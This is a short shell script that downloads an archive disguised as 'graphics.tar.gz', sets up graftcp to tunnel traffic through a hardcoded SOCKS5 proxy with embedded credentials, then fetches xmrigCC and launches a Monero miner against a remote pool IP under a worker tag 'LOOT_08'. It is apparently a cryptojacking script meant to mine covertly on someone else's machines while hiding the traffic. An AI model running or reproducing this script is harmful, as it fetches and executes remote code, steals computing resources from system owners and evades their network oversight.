#apt-get update -y
wget https://github.com/Melpinoy/Gg/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 209.94.62.246:443

socks5_username = temera1

socks5_password = temera1

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz && tar -xvf xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz && cd miner && ./xmrigDaemon -o 34.149.22.228:9200 -u 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.LOOT_08 -p x -a rx/0 -t 4 -k --donate-level 0
